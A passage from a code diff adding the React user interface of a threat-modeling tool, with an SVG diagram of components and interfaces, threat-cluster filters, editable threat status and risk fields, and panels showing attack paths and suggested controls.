+                          const tbX = midX - nx2 * 14;
+                          const tbY = midY - ny2 * 14;
+                          return (
+                            <g transform={`translate(${tbX}, ${tbY})`}>
+                              <rect x="-10" y="-6" width="20" height="12" rx="3" fill={darkMode ? '#7c2d12' : '#fff7ed'} stroke="#f97316" strokeWidth="0.5" opacity="0.9" />
+                              <text y="3" fill={darkMode ? '#fb923c' : '#c2410c'} fontSize="7" fontWeight="600" textAnchor="middle">TB</text>
+                            </g>
+                          );
+                        })()}
+                      </g>
+                    );
+                  })}
+
+                  {/* Components */}
+                  {components.map(comp => {
+                    const pos = getAbsolutePosition(comp);
+                    const isSelected = selectedElement?.type === 'component' && selectedElement.data.id === comp.id;
+                    const isConnecting = connectionMode?.from === comp.id;
+                    const layer = COMPONENT_LAYERS[comp.layer];
+                    const compThreatCount = (comp.threats || []).filter(t => t.applicable && t.status === 'Identified').length;
+                    const matchesFilter = !filterCluster || (comp.threats || []).some(t => t.clusterId === filterCluster && t.applicable) || interfaces.some(i => (i.fromId === comp.id || i.toId === comp.id) && i.threats.some(t => t.clusterId === filterCluster && t.applicable));
+
+                    return (
+                      <g key={comp.id} transform={`translate(${pos.x}, ${pos.y})`}
+                        style={{ opacity: filterCluster && !matchesFilter ? 0.2 : 1 }}
+                        filter={isSelected ? 'url(#glow-blue)' : undefined}
+                        onClick={(e) => { e.stopPropagation(); handleElementClick(comp, 'component'); }}
+                        onMouseDown={(e) => {
+                          if (e.button !== 0 || connectionMode) return;
+                          const move = (ev) => handleElementDrag(ev, comp.id, 'component');
+                          const up = () => { document.removeEventListener('mousemove', move); document.removeEventListener('mouseup', up); };
+                          document.addEventListener('mousemove', move); document.addEventListener('mouseup', up);
+                        }}
+                        className="cursor-move">
+                        {isSelected && (
+                          <rect x="-3" y="-3" width="86" height="56" rx="9"
+                            fill="none" stroke="#3b82f6" strokeWidth="2" opacity="0.5" />
+                        )}
+                        <rect x="0" y="0" width="80" height="50" rx="6"
+                          fill={comp.metadata.isThirdParty ? (darkMode ? '#1c1917' : '#fffbeb') : (darkMode ? '#0f172a' : '#ffffff')}
+                          stroke={isSelected ? '#60a5fa' : isConnecting ? '#22c55e' : layer?.color || (darkMode ? '#334155' : '#cbd5e1')}
+                          strokeWidth={isSelected ? 2.5 : isConnecting ? 2 : 1}
+                        />
+                        <text x="40" y="20" fill={darkMode ? '#e2e8f0' : '#1e293b'} fontSize="14" textAnchor="middle">{comp.icon}</text>
+                        <text x="40" y="36" fill={darkMode ? '#e2e8f0' : '#1e293b'} fontSize="9" textAnchor="middle" fontWeight="500">
+                          {comp.name.length > 10 ? comp.name.slice(0, 10) + '…' : comp.name}
+                        </text>
+                        <text x="40" y="46" fill="#64748b" fontSize="7" textAnchor="middle">
+                          {comp.metadata.version || comp.layer}
+                        </text>
+                        {comp.metadata.isThirdParty && <circle cx="72" cy="8" r="5" fill="#f59e0b" />}
+                        {compThreatCount > 0 && (
+                          <g transform="translate(8, 8)">
+                            <circle r="8" fill="#ef4444" />
+                            <text y="3" fill="white" fontSize="9" fontWeight="bold" textAnchor="middle">{compThreatCount}</text>
+                          </g>
+                        )}
+                      </g>
+                    );
+                  })}
+                </svg>
+              </div>
+
+              {/* Filter bar */}
+              <div className={`${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'} border-t px-3 py-1.5 flex items-center gap-1.5 overflow-x-auto flex-shrink-0`}>
+                <span className="text-xs text-slate-500 mr-1">Filter:</span>
+                <button onClick={() => setFilterCluster(null)}
+                  className={`px-2 py-0.5 text-xs rounded ${!filterCluster ? (darkMode ? 'bg-slate-600' : 'bg-slate-300') : (darkMode ? 'bg-slate-700 hover:bg-slate-600' : 'bg-slate-100 hover:bg-slate-200')}`}>All</button>
+                {Object.values(TLCTC_CLUSTERS).map(c => (
+                  <button key={c.id} onClick={() => setFilterCluster(filterCluster === c.id ? null : c.id)}
+                    className={`px-1.5 py-0.5 text-xs rounded flex items-center gap-1 ${filterCluster === c.id ? (darkMode ? 'ring-1 ring-white' : 'ring-1 ring-slate-900') : ''}`}
+                    style={{ backgroundColor: `${c.color}${darkMode ? '25' : '18'}`, color: c.color }}>
+                    <span className="font-mono font-bold">{c.id}</span>
+                    {clusterCounts[c.id] > 0 && <span className={`${darkMode ? 'bg-black/30 text-white' : 'bg-black/10 text-slate-800'} px-1 rounded`}>{clusterCounts[c.id]}</span>}
+                  </button>
+                ))}
+              </div>
+            </main>
+
+            {/* Right Panel */}
+            {selectedElement && (
+              <aside className={`w-72 ${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'} border-l flex flex-col overflow-hidden flex-shrink-0`}>
+                <div className={`p-3 border-b ${darkMode ? 'border-slate-700' : 'border-slate-200'} flex items-center justify-between`}>
+                  <h3 className="font-medium capitalize">{selectedElement.type}</h3>
+                  <button onClick={() => deleteElement(selectedElement.data.id, selectedElement.type)} className={`p-1 ${darkMode ? 'hover:bg-red-900/50 text-red-400' : 'hover:bg-red-100 text-red-500'} rounded`}>
+                    <Icons.Trash />
+                  </button>
+                </div>
+                <div className="flex-1 overflow-y-auto p-3 space-y-3">
+                  {/* Group properties */}
+                  {selectedElement.type === 'group' && (
+                    <>
+                      <div>
+                        <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Name</label>
+                        <input type="text" value={selectedElement.data.name}
+                          onChange={(e) => { const u = {...selectedElement.data, name: e.target.value}; setGroups(groups.map(g => g.id === u.id ? u : g)); setSelectedElement({...selectedElement, data: u}); }}
+                          className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                      </div>
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Version</label>
+                          <input type="text" value={selectedElement.data.metadata.version}
+                            onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, version: e.target.value}}; setGroups(groups.map(g => g.id === u.id ? u : g)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                        </div>
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Owner</label>
+                          <select value={selectedElement.data.metadata.owner}
+                            onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, owner: e.target.value}}; setGroups(groups.map(g => g.id === u.id ? u : g)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`}>
+                            {RESPONSIBILITY_SPHERES.map(s => <option key={s} value={s}>{s}</option>)}
+                          </select>
+                        </div>
+                      </div>
+                    </>
+                  )}
+
+                  {/* Component properties */}
+                  {selectedElement.type === 'component' && (
+                    <>
+                      <div>
+                        <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Name</label>
+                        <input type="text" value={selectedElement.data.name}
+                          onChange={(e) => { const u = {...selectedElement.data, name: e.target.value}; setComponents(components.map(c => c.id === u.id ? u : c)); setSelectedElement({...selectedElement, data: u}); }}
+                          className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                      </div>
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Version</label>
+                          <input type="text" value={selectedElement.data.metadata.version}
+                            onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, version: e.target.value}}; setComponents(components.map(c => c.id === u.id ? u : c)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                        </div>
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Owner</label>
+                          <select value={selectedElement.data.metadata.owner}
+                            onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, owner: e.target.value}}; setComponents(components.map(c => c.id === u.id ? u : c)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`}>
+                            {RESPONSIBILITY_SPHERES.map(s => <option key={s} value={s}>{s}</option>)}
+                          </select>
+                        </div>
+                      </div>
+                      <div className="flex items-center gap-2">
+                        <input type="checkbox" id="is3p" checked={selectedElement.data.metadata.isThirdParty}
+                          onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, isThirdParty: e.target.checked}}; setComponents(components.map(c => c.id === u.id ? u : c)); setSelectedElement({...selectedElement, data: u}); }}
+                          className="rounded" />
+                        <label htmlFor="is3p" className="text-sm">Third-Party</label>
+                      </div>
+                      <div>
+                        <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>SBOM Reference</label>
+                        <input type="text" value={selectedElement.data.metadata.sbom || ''}
+                          onChange={(e) => { const u = {...selectedElement.data, metadata: {...selectedElement.data.metadata, sbom: e.target.value}}; setComponents(components.map(c => c.id === u.id ? u : c)); setSelectedElement({...selectedElement, data: u}); }}
+                          placeholder="Link or reference" className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                      </div>
+
+                      {/* Component Threats — Enhanced with examples */}
+                      <div className={`border-t ${darkMode ? 'border-slate-700' : 'border-slate-200'} pt-3`}>
+                        <div className="flex items-center justify-between mb-2">
+                          <h4 className="font-medium text-amber-400 text-sm">Identified Threats</h4>
+                          <span className={`text-xs ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} px-2 py-0.5 rounded`}>{(selectedElement.data.threats || []).filter(t => t.applicable).length}</span>
+                        </div>
+                        <div className="space-y-2 mb-2 max-h-96 overflow-y-auto">
+                          {(selectedElement.data.threats || []).map(threat => {
+                            const cluster = TLCTC_CLUSTERS[threat.clusterId];
+                            if (!cluster) return null;
+                            const exKey = `${selectedElement.data.id}-${threat.clusterId}`;
+                            const isExpanded = expandedThreats.has(exKey);
+                            const ex = getThreatExample(selectedElement.data.type, threat.clusterId);
+                            const clDef = CLUSTER_DEFINITIONS[threat.clusterId];
+                            return (
+                              <div key={threat.clusterId} className="p-2 rounded border text-sm" style={{ backgroundColor: `${cluster.color}10`, borderColor: `${cluster.color}50` }}>
+                                <div className="flex items-center justify-between mb-1">
+                                  <span className="font-mono font-bold" style={{ color: cluster.color }}>{threat.clusterId} <span className="text-xs font-normal text-slate-400">{cluster.shortName}</span></span>
+                                  <div className="flex items-center gap-1">
+                                    <select value={threat.status} onChange={(e) => updateComponentThreat(selectedElement.data.id, threat.clusterId, { status: e.target.value })}
+                                      className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                      <option>Identified</option><option>Mitigated</option><option>Accepted</option>
+                                    </select>
+                                    <button onClick={() => removeThreatFromComponent(selectedElement.data.id, threat.clusterId)} className={`p-0.5 ${darkMode ? 'hover:bg-slate-600' : 'hover:bg-slate-200'} rounded`}><Icons.X /></button>
+                                  </div>
+                                </div>
+                                {/* Typical implementation preview */}
+                                {ex && <p className="text-xs text-slate-400 italic leading-tight mb-1">{ex.typicalImpl}</p>}
+                                {!ex && clDef && <p className="text-xs text-slate-400 italic leading-tight mb-1">{cluster.description}</p>}
+                                <div className="grid grid-cols-2 gap-1 mt-1">
+                                  <select value={threat.velocityClass} onChange={(e) => updateComponentThreat(selectedElement.data.id, threat.clusterId, { velocityClass: e.target.value })}
+                                    className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                    {Object.values(VELOCITY_CLASSES).map(vc => <option key={vc.id} value={vc.id}>{vc.id}</option>)}
+                                  </select>
+                                  <select value={threat.residualRisk} onChange={(e) => updateComponentThreat(selectedElement.data.id, threat.clusterId, { residualRisk: e.target.value })}
+                                    className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                    <option>Critical</option><option>High</option><option>Medium</option><option>Low</option>
+                                  </select>
+                                </div>
+                                <input type="text" value={threat.notes} onChange={(e) => updateComponentThreat(selectedElement.data.id, threat.clusterId, { notes: e.target.value })}
+                                  placeholder="Controls, CVEs..." className={`w-full ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-2 py-1 mt-1`} />
+                                {threat.status === 'Mitigated' && (
+                                  <div className="mt-1">
+                                    <input type="url" value={threat.controlRef || ''} onChange={(e) => updateComponentThreat(selectedElement.data.id, threat.clusterId, { controlRef: e.target.value })}
+                                      placeholder="Control documentation URL..." className={`w-full ${darkMode ? 'bg-slate-600 border-green-700/50' : 'bg-green-50 border-green-300'} border text-xs rounded px-2 py-1`} />
+                                  </div>
+                                )}
+                                {/* Expand/collapse for details */}
+                                <button onClick={() => setExpandedThreats(prev => { const n = new Set(prev); n.has(exKey) ? n.delete(exKey) : n.add(exKey); return n; })}
+                                  className="text-xs text-blue-400 hover:text-blue-300 mt-1 cursor-pointer">
+                                  {isExpanded ? '▾ Less' : '▸ Details & Examples'}
+                                </button>
+                                {isExpanded && (
+                                  <div className="mt-2 space-y-2 border-t border-slate-600/50 pt-2">
+                                    {clDef && (
+                                      <div><span className="text-xs font-medium text-slate-300">Generic Vulnerability:</span>
+                                        <p className="text-xs text-slate-400 leading-tight">{clDef.genericVuln}</p></div>
+                                    )}
+                                    {clDef && (
+                                      <div><span className="text-xs font-medium text-slate-300">Attacker's View:</span>
+                                        <p className="text-xs text-slate-400 italic leading-tight">"{clDef.attackerView}"</p></div>
+                                    )}
+                                    {ex && (
+                                      <>
+                                        <div><span className="text-xs font-medium text-amber-400">Example Attack:</span>
+                                          <p className="text-xs text-slate-400 leading-tight">{ex.example}</p></div>
+                                        {ex.paths.length > 0 && (
+                                          <div><span className="text-xs font-medium text-red-400">Common Attack Paths:</span>
+                                            {ex.paths.map((p, i) => <div key={i} className="text-xs text-slate-400 ml-2 leading-tight">→ {p}</div>)}</div>
+                                        )}
+                                        {ex.mitigations.length > 0 && (
+                                          <div><span className="text-xs font-medium text-green-400">Suggested Controls:</span>
+                                            {ex.mitigations.map((m, i) => <div key={i} className="text-xs text-slate-400 ml-2 leading-tight">• {m}</div>)}</div>
+                                        )}
+                                        {ex.mitre.length > 0 && (
+                                          <div><span className="text-xs font-medium text-purple-400">MITRE ATT&CK:</span>
+                                            <div className="flex flex-wrap gap-1 mt-0.5">
+                                              {ex.mitre.map((ref, i) => <span key={i} className={`px-1.5 py-0.5 ${darkMode ? 'bg-purple-900/30 text-purple-300' : 'bg-purple-100 text-purple-700'} rounded text-xs`}>{ref}</span>)}
+                                            </div></div>
+                                        )}
+                                      </>
+                                    )}
+                                    {!ex && clDef && (
+                                      <div><span className="text-xs font-medium text-slate-500">Developer's View:</span>
+                                        <p className="text-xs text-slate-400 leading-tight">"{clDef.devView}"</p></div>
+                                    )}
+                                  </div>
+                                )}
+                              </div>
+                            );
+                          })}
+                        </div>
+                        {/* Pending suggestions from smart interface mapping */}
+                        {pendingSuggestions.filter(s => s.componentId === selectedElement.data.id).length > 0 && (
+                          <div className="space-y-1 mb-2">
+                            {pendingSuggestions.filter(s => s.componentId === selectedElement.data.id).map(sug => (
+                              <div key={sug.id} className="p-2 rounded border border-amber-600/50 bg-amber-900/20 flex items-center gap-2">
+                                <div className="flex-1">
+                                  <span className="text-xs font-mono font-bold" style={{ color: TLCTC_CLUSTERS[sug.clusterId]?.color }}>{sug.clusterId}</span>
+                                  <span className="text-xs text-slate-400 ml-1">{sug.reason}</span>
+                                </div>
+                                <button onClick={() => { addThreatToComponent(sug.componentId, sug.clusterId); setPendingSuggestions(prev => prev.filter(p => p.id !== sug.id)); }}
+                                  className="text-xs px-2 py-0.5 bg-amber-600 hover:bg-amber-500 rounded font-medium">Apply</button>
+                                <button onClick={() => setPendingSuggestions(prev => prev.filter(p => p.id !== sug.id))}
+                                  className="text-xs text-slate-500 hover:text-slate-300">✕</button>
+                              </div>
+                            ))}
+                          </div>
+                        )}
+                        <select value="" onChange={(e) => { if (e.target.value) addThreatToComponent(selectedElement.data.id, e.target.value); }}
+                          className={`w-full ${darkMode ? 'bg-slate-700 border-slate-500' : 'bg-slate-100 border-slate-400'} border border-dashed rounded px-2 py-1.5 text-sm`}>
+                          <option value="">+ Add threat cluster...</option>
+                          {Object.values(TLCTC_CLUSTERS).filter(c => !(selectedElement.data.threats || []).find(t => t.clusterId === c.id)).map(c => <option key={c.id} value={c.id}>{c.id} - {c.name}</option>)}
+                        </select>
+                      </div>
+                    </>
+                  )}
+
+                  {/* Interface properties — Enhanced with Client-Server analysis */}
+                  {selectedElement.type === 'interface' && (
+                    <>
+                      <div>
+                        <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Name</label>
+                        <input type="text" value={selectedElement.data.name}
+                          onChange={(e) => { const u = {...selectedElement.data, name: e.target.value}; setInterfaces(interfaces.map(i => i.id === u.id ? u : i)); setSelectedElement({...selectedElement, data: u}); }}
+                          className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                      </div>
+                      <div className="p-2 rounded text-sm" style={{ backgroundColor: selectedElement.data.interfaceType === 'internal' ? (darkMode ? '#1e293b' : '#f1f5f9') : (darkMode ? '#172554' : '#eff6ff'), borderLeft: `3px solid ${selectedElement.data.interfaceType === 'internal' ? '#64748b' : '#3b82f6'}` }}>
+                        {selectedElement.data.interfaceType === 'internal' ? 'Internal (in-process)' : 'Network Interface'}
+                      </div>
+
+                      {/* Client-Server Role Analysis (Axiom II) */}
+                      {selectedElement.data.clientComponentId && (() => {
+                        const clientComp = components.find(c => c.id === selectedElement.data.clientComponentId);
+                        const serverComp = components.find(c => c.id === selectedElement.data.serverComponentId);
+                        return (
+                          <div className={`p-2 rounded border ${darkMode ? 'border-blue-700/40 bg-blue-900/20' : 'border-blue-200 bg-blue-50'}`}>
+                            <div className="text-xs font-medium text-blue-300 mb-1.5">Axiom II: Client → Server</div>
+                            <div className="flex items-center gap-1.5 text-xs flex-wrap">
+                              <span className="px-1.5 py-0.5 bg-orange-900/40 text-orange-300 rounded font-medium cursor-pointer hover:bg-orange-900/60"
+                                onClick={(e) => { e.stopPropagation(); if (clientComp) handleElementClick(clientComp, 'component'); }}>
+                                C: {clientComp?.name || '?'}
+                              </span>
+                              <span className="text-slate-500">→</span>
+                              <span className="px-1.5 py-0.5 bg-red-900/40 text-red-300 rounded font-medium cursor-pointer hover:bg-red-900/60"
+                                onClick={(e) => { e.stopPropagation(); if (serverComp) handleElementClick(serverComp, 'component'); }}>
+                                S: {serverComp?.name || '?'}
+                              </span>
+                            </div>
+                            <div className="text-xs text-slate-500 mt-1 flex items-center gap-2">
+                              <span>Confidence: {selectedElement.data.roleConfidence}</span>
+                              {selectedElement.data.crossesTrustBoundary && <span className="text-amber-400 font-medium">Trust Boundary</span>}
+                            </div>
+                          </div>
+                        );
+                      })()}
+
+                      <div className="grid grid-cols-2 gap-2">
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Protocol</label>
+                          <select value={selectedElement.data.protocol}
+                            onChange={(e) => { const u = {...selectedElement.data, protocol: e.target.value}; setInterfaces(interfaces.map(i => i.id === u.id ? u : i)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`}>
+                            {['Internal Call', 'Function Call', 'HTTPS', 'HTTP', 'gRPC', 'TCP', 'WebSocket', 'AMQP'].map(p => <option key={p}>{p}</option>)}
+                          </select>
+                        </div>
+                        <div>
+                          <label className={`block text-xs ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Port</label>
+                          <input type="text" value={selectedElement.data.port}
+                            onChange={(e) => { const u = {...selectedElement.data, port: e.target.value}; setInterfaces(interfaces.map(i => i.id === u.id ? u : i)); setSelectedElement({...selectedElement, data: u}); }}
+                            className={`w-full ${darkMode ? 'bg-slate-700 border-slate-600' : 'bg-slate-100 border-slate-300'} border rounded px-2 py-1.5 text-sm`} />
+                        </div>
+                      </div>
+
+                      {/* Pending suggestions for connected components */}
+                      {pendingSuggestions.filter(s =>
+                        s.componentId === selectedElement.data.clientComponentId || s.componentId === selectedElement.data.serverComponentId
+                      ).length > 0 && (
+                        <div className="space-y-1">
+                          <div className="text-xs font-medium text-amber-400">Suggested Component Threats:</div>
+                          {pendingSuggestions.filter(s =>
+                            s.componentId === selectedElement.data.clientComponentId || s.componentId === selectedElement.data.serverComponentId
+                          ).map(sug => (
+                            <div key={sug.id} className="p-1.5 rounded border border-amber-600/40 bg-amber-900/15 flex items-center gap-1.5">
+                              <span className="text-xs font-mono font-bold" style={{ color: TLCTC_CLUSTERS[sug.clusterId]?.color }}>{sug.clusterId}</span>
+                              <span className="text-xs text-slate-400 flex-1 leading-tight">{sug.reason}</span>
+                              <button onClick={() => { addThreatToComponent(sug.componentId, sug.clusterId); setPendingSuggestions(prev => prev.filter(p => p.id !== sug.id)); }}
+                                className="text-xs px-1.5 py-0.5 bg-amber-600 hover:bg-amber-500 rounded">+</button>
+                              <button onClick={() => setPendingSuggestions(prev => prev.filter(p => p.id !== sug.id))}
+                                className="text-xs text-slate-500 hover:text-slate-300">✕</button>
+                            </div>
+                          ))}
+                        </div>
+                      )}
+
+                      {/* Interface Threats */}
+                      <div className={`border-t ${darkMode ? 'border-slate-700' : 'border-slate-200'} pt-3`}>
+                        <div className="flex items-center justify-between mb-2">
+                          <h4 className="font-medium text-amber-400 text-sm">Identified Threats</h4>
+                          <span className={`text-xs ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} px-2 py-0.5 rounded`}>{selectedElement.data.threats.filter(t => t.applicable).length}</span>
+                        </div>
+                        <div className="space-y-2 mb-2 max-h-64 overflow-y-auto">
+                          {selectedElement.data.threats.map(threat => {
+                            const cluster = TLCTC_CLUSTERS[threat.clusterId];
+                            if (!cluster) return null;
+                            const clDef = CLUSTER_DEFINITIONS[threat.clusterId];
+                            const exKey = `iface-${selectedElement.data.id}-${threat.clusterId}`;
+                            const isExpanded = expandedThreats.has(exKey);
+                            return (
+                              <div key={threat.clusterId} className="p-2 rounded border text-sm" style={{ backgroundColor: `${cluster.color}10`, borderColor: `${cluster.color}50` }}>
+                                <div className="flex items-center justify-between mb-1">
+                                  <span className="font-mono font-bold" style={{ color: cluster.color }}>{threat.clusterId} <span className="text-xs font-normal text-slate-400">{cluster.shortName}</span></span>
+                                  <div className="flex items-center gap-1">
+                                    <select value={threat.status} onChange={(e) => updateInterfaceThreat(selectedElement.data.id, threat.clusterId, { status: e.target.value })}
+                                      className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                      <option>Identified</option><option>Mitigated</option><option>Accepted</option>
+                                    </select>
+                                    <button onClick={() => removeThreatFromInterface(selectedElement.data.id, threat.clusterId)} className={`p-0.5 ${darkMode ? 'hover:bg-slate-600' : 'hover:bg-slate-200'} rounded`}><Icons.X /></button>
+                                  </div>
+                                </div>
+                                {clDef && <p className="text-xs text-slate-400 italic leading-tight mb-1">{cluster.description}</p>}
+                                <div className="grid grid-cols-2 gap-1 mt-1">
+                                  <select value={threat.velocityClass} onChange={(e) => updateInterfaceThreat(selectedElement.data.id, threat.clusterId, { velocityClass: e.target.value })}
+                                    className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                    {Object.values(VELOCITY_CLASSES).map(vc => <option key={vc.id} value={vc.id}>{vc.id}</option>)}
+                                  </select>
+                                  <select value={threat.residualRisk} onChange={(e) => updateInterfaceThreat(selectedElement.data.id, threat.clusterId, { residualRisk: e.target.value })}
+                                    className={`${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-1 py-0.5`}>
+                                    <option>Critical</option><option>High</option><option>Medium</option><option>Low</option>
+                                  </select>
+                                </div>
+                                <input type="text" value={threat.notes} onChange={(e) => updateInterfaceThreat(selectedElement.data.id, threat.clusterId, { notes: e.target.value })}
+                                  placeholder="Controls, CVEs..." className={`w-full ${darkMode ? 'bg-slate-700' : 'bg-slate-200'} border-0 text-xs rounded px-2 py-1 mt-1`} />
+                                {threat.status === 'Mitigated' && (
+                                  <div className="mt-1">
+                                    <input type="url" value={threat.controlRef || ''} onChange={(e) => updateInterfaceThreat(selectedElement.data.id, threat.clusterId, { controlRef: e.target.value })}
+                                      placeholder="Control documentation URL..." className={`w-full ${darkMode ? 'bg-slate-600 border-green-700/50' : 'bg-green-50 border-green-300'} border text-xs rounded px-2 py-1`} />
+                                  </div>
+                                )}
+                                <button onClick={() => setExpandedThreats(prev => { const n = new Set(prev); n.has(exKey) ? n.delete(exKey) : n.add(exKey); return n; })}
+                                  className="text-xs text-blue-400 hover:text-blue-300 mt-1 cursor-pointer">
+                                  {isExpanded ? '▾ Less' : '▸ Details'}
+                                </button>
+                                {isExpanded && clDef && (
+                                  <div className="mt-2 space-y-1.5 border-t border-slate-600/50 pt-2">
+                                    <div><span className="text-xs font-medium text-slate-300">Generic Vulnerability:</span>
+                                      <p className="text-xs text-slate-400 leading-tight">{clDef.genericVuln}</p></div>
+                                    <div><span className="text-xs font-medium text-slate-300">Attacker's View:</span>
+                                      <p className="text-xs text-slate-400 italic leading-tight">"{clDef.attackerView}"</p></div>
+                                  </div>
+                                )}
+                              </div>
+                            );
+                          })}
+                        </div>
+                        <select value="" onChange={(e) => { if (e.target.value) addThreatToInterface(selectedElement.data.id, e.target.value); }}
+                          className={`w-full ${darkMode ? 'bg-slate-700 border-slate-500' : 'bg-slate-100 border-slate-400'} border border-dashed rounded px-2 py-1.5 text-sm`}>
+                          <option value="">+ Add threat cluster...</option>
+                          {Object.values(TLCTC_CLUSTERS).filter(c => !selectedElement.data.threats.find(t => t.clusterId === c.id)).map(c => <option key={c.id} value={c.id}>{c.id} - {c.name}</option>)}
+                        </select>
+                      </div>
+
+                      {/* Suggested Attack Paths for this interface */}
+                      {(() => {
+                        const paths = detectAttackPaths([selectedElement.data], components);
+                        if (paths.length === 0) return null;
+                        return (
+                          <div className={`border-t ${darkMode ? 'border-slate-700' : 'border-slate-200'} pt-3`}>
+                            <h4 className="font-medium text-red-400 text-sm mb-2">Attack Paths</h4>
+                            <div className="space-y-1.5 max-h-48 overflow-y-auto">
+                              {paths.map((path, i) => (
+                                <div key={i} className={`p-2 rounded ${darkMode ? 'bg-red-900/10 border-red-800/30' : 'bg-red-50 border-red-200'} border`}>
+                                  <div className="text-xs font-medium text-red-300">{path.name}</div>
+                                  <div className="flex items-center gap-1 mt-1 flex-wrap">
+                                    {path.chain.map((step, j) => (
+                                      <React.Fragment key={j}>
+                                        <span className="px-1.5 py-0.5 rounded text-xs font-mono font-bold"
+                                          style={{ backgroundColor: `${TLCTC_CLUSTERS[step]?.color}20`, color: TLCTC_CLUSTERS[step]?.color }}>
+                                          {step}
+                                        </span>
+                                        {j < path.chain.length - 1 && <span className="text-slate-600 text-xs">→</span>}
+                                      </React.Fragment>
+                                    ))}
+                                  </div>
+                                  <p className="text-xs text-slate-500 mt-1 leading-tight">{path.desc}</p>
+                                </div>
+                              ))}
+                            </div>
+                          </div>
+                        );
+                      })()}
+                    </>
+                  )}
+                </div>
+              </aside>
+            )}
+
+            {/* Reference panel */}
+            {!selectedElement && (
+              <aside className={`w-60 ${darkMode ? 'bg-slate-800 border-slate-700' : 'bg-white border-slate-200'} border-l overflow-y-auto p-3 flex-shrink-0`}>
+                <h3 className="font-medium mb-2 text-sm">TLCTC Quick Reference</h3>
+                <div className="space-y-1">
+                  {Object.values(TLCTC_CLUSTERS).map(c => (
+                    <div key={c.id} onClick={() => setFilterCluster(filterCluster === c.id ? null : c.id)}
+                      className="p-2 rounded cursor-pointer hover:opacity-80" style={{ backgroundColor: `${c.color}15`, borderLeft: `3px solid ${c.color}` }}>
+                      <div className="flex items-center gap-2">
+                        <span className="font-mono font-bold text-sm" style={{ color: c.color }}>{c.id}</span>
+                        <span className="text-xs">{c.name}</span>
+                        {clusterCounts[c.id] > 0 && <span className={`ml-auto text-xs ${darkMode ? 'bg-black/30' : 'bg-black/10'} px-1.5 rounded`}>{clusterCounts[c.id]}</span>}
+                      </div>
+                      <p className="text-xs text-slate-500 mt-0.5">{c.description}</p>
+                    </div>
+                  ))}
+                </div>
+              </aside>
+            )}
+          </div>
+
+          {/* Settings Modal */}
+          {showSettings && (
+            <div className={`fixed inset-0 ${darkMode ? 'bg-black/60' : 'bg-black/40'} flex items-center justify-center z-50`} onClick={() => setShowSettings(false)}>
+              <div className={`${darkMode ? 'bg-slate-800' : 'bg-white'} rounded-xl w-full max-w-md p-6 m-4 shadow-xl`} onClick={e => e.stopPropagation()}>
+                <h2 className="text-lg font-bold mb-4">Project Settings</h2>
+                <div className="space-y-3">
+                  <div><label className={`block text-sm ${darkMode ? 'text-slate-400' : 'text-slate-500'} mb-1`}>Project Name</label>
